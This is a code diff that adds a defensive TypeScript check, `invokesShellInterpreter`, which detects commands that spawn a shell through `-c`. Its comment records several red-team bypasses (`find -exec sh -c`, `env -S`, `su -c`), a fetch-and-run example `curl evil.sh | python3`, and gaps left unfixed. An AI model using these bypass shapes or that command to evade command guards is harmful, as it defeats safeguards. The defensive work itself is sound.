@@ -117,6 +117,119 @@ export function looksLikeCompoundCommand(argv: string[]): boolean {
   return argv.some((t) => SHELL_CONTROL_OPERATORS.has(t));
 }
 
+const SHELL_INTERPRETER_BASENAMES = new Set(['sh', 'bash', 'zsh', 'dash', 'ash', 'ksh']);
+
+// Not shells themselves, but their own `-c` flag spawns one regardless (e.g.
+// `su -c "..."` runs the target user's shell with `-c`). Round 3, see below.
+const SHELL_SPAWNING_DASH_C_COMMANDS = new Set(['su']);
+
+function basename(path: string): string {
+  const slash = path.lastIndexOf('/');
+  return slash === -1 ? path : path.slice(slash + 1);
+}
+
+/**
+ * True if ANY position in argv names a shell interpreter followed somewhere
+ * later by a literal `-c` token — e.g. `sh -c "echo a && echo b"` at argv[0],
+ * or `sh` buried deeper in argv via a wrapper command.
+ *
+ * Live-reproduced 2026-10-18 (security-adversarial night, SCAN=redblue,
+ * supply-chain): `execFile('sh', ['-c', 'echo A > f && echo B'])` really runs
+ * `/bin/sh`, which really interprets `&&` as a shell operator — confirmed by
+ * running `verify-entrypoints` against a real config entry of exactly this
+ * shape, which wrote a file and ran a second statement. `execFile`'s "never
+ * a shell" guarantee (the premise `looksLikeCompoundCommand` and the
+ * `verify-entrypoints` trust-boundary comment both rest on) depends entirely
+ * on *which binary* argv names — naming a shell itself with `-c` reproduces
+ * full shell semantics despite `shell: true` never being set anywhere, and
+ * `looksLikeCompoundCommand` cannot see it: `tokenizeCommand`'s own
+ * double-quote handling (correctly) folds the whole `-c` payload into one
+ * token, so none of `&&`/`;`/`|` ever appears as its own standalone argv
+ * entry for that check to find.
+ *
+ * **Widened twice more same night, both BLOCKED rounds with a fresh
+ * independent critic each time, each fix verified live**:
+ *
+ * Round 2: a first draft checked only argv[0]. The critic live-reproduced a
+ * bypass that survives it: `find . -maxdepth 0 -exec sh -c "touch PWNED &&
+ * echo pwned" {} +` — argv[0] is `find`, not a shell, so the argv[0]-only
+ * check missed it, yet `find` itself spawns `/bin/sh -c '<payload>'`
+ * internally and the payload really ran (confirmed live). The same class
+ * applies to `xargs -I{} sh -c '...'`, GNU `parallel --exec`, `timeout`/
+ * `nice`/`ssh host`/`docker run` wrapping a literal `sh -c`, or a `make` rule
+ * under `SHELL=sh`. Fixed by scanning every argv position, not just argv[0].
+ *
+ * Round 3: a second, fresh critic (no context from round 2) live-reproduced
+ * two more real bypasses of the round-2 fix: (a) `env -S "sh -c '...'"` —
+ * GNU coreutils' `env -S`/`--split-string` word-splits its own argument into
+ * a fresh argv and re-execs it, so the nested `sh -c` is hidden inside one
+ * quoted token (the same quoting trick the original bug used, one level
+ * deeper) — confirmed live, file written, `&&`'s second statement ran; (b)
+ * `su -c "..."` — `su` is not a shell itself but its own `-c` flag spawns
+ * the target user's shell with `-c`, independent of any shell basename —
+ * confirmed live as root. Fixed: `su` added alongside the shell basenames
+ * (identical detection — `-c` anywhere after it); `env -S`/`--split-string`'s
+ * argument is recursively re-tokenized and re-scanned, since it is itself a
+ * full nested command string, the same way the outer command is.
+ *
+ * Accepted, disclosed trade-off from round 2's widening: a command that
+ * merely passes the literal strings `sh`/`bash`/etc. and `-c` as inert
+ * arguments to an unrelated program (e.g. `echo sh -c`) now also blocks,
+ * even though no shell is actually invoked — fail-closed, same posture this
+ * module's sibling `looksLikeCompoundCommand` already accepts, and not a
+ * shape any real `evaluatorEntrypoints`/`controlPlaneProbes` value in this
+ * repo has ever used.
+ *
+ * **This is a denylist of known shell-spawning wrappers, not a closed set —
+ * three rounds of independent critique each found a new one, and that
+ * pattern should be expected to continue**: `fish`/`csh`/`tcsh` (not in
+ * `SHELL_INTERPRETER_BASENAMES`, support `-c`, not live-tested — neither
+ * binary exists in this sandbox), a combined flag (`-ic`), `env`'s glued
+ * `--split-string=<value>`/`-SSTRING` forms (dropped deliberately: a quote
+ * immediately after `=` is not at the very start of a whitespace-delimited
+ * chunk, so `tokenizeCommand` itself already mis-splits it per that
+ * function's own disclosed scope — live-confirmed it produces garbage
+ * tokens, not a usable nested command string, so building a second parser
+ * just for this one glued flag form would be its own source of bugs rather
+ * than a real fix), a renamed/symlinked interpreter binary, and any future
+ * tool with its own "run this string" flag are all known, disclosed,
+ * NOT-fixed gaps — not silently assumed safe. `evaluatorEntrypoints`'
+ * underlying trust boundary has never been "no command can misbehave"; it
+ * is, and remains, "this value is repo-committed, PR-reviewed config, not
+ * attacker-controlled at runtime" (stated in `index.ts`'s own comment at
+ * this command's call site) — this function is defense-in-depth against a
+ * malformed or careless config shape reaching a real shell by accident, not
+ * a hard security boundary against a deliberately adversarial config author,
+ * who could already run anything via a single well-formed command regardless
+ * (e.g. `curl evil.sh | python3`, an already-acknowledged, unfixed-by-design
+ * risk class — see `supplychain.ts`'s header comment for the same framing
+ * applied to unpinned `npx`).
+ */
+export function invokesShellInterpreter(argv: string[]): boolean {
+  for (let i = 0; i < argv.length; i++) {
+    const name = basename(argv[i]);
+    if ((SHELL_INTERPRETER_BASENAMES.has(name) || SHELL_SPAWNING_DASH_C_COMMANDS.has(name)) &&
+        argv.slice(i + 1).includes('-c')) {
+      return true;
+    }
+    if (name === 'env') {
+      for (let j = i + 1; j < argv.length; j++) {
+        // `--split-string=<value>` (no space before the quote) is deliberately not
+        // handled: tokenizeCommand's own doc comment already discloses that a quote
+        // embedded mid-token (not at the very start of a whitespace-delimited chunk)
+        // is not special, so this glued form comes out of tokenizeCommand already
+        // garbled — building a second, separate parser just for this one flag's glued
+        // form would be its own source of bugs. Known, disclosed, not fixed.
+        if (argv[j] === '-S' || argv[j] === '--split-string') {
+          const nested = argv[j + 1];
+          if (nested !== undefined && invokesShellInterpreter(tokenizeCommand(nested))) return true;
+        }
+      }
+    }
+  }
+  return false;
+}
+
 /** Classify a completed entrypoint invocation. Pure — no I/O. */
 export function classifyEntrypointResult(r: ExecResult): EntrypointCheck {
   if (r.code !== 0) {
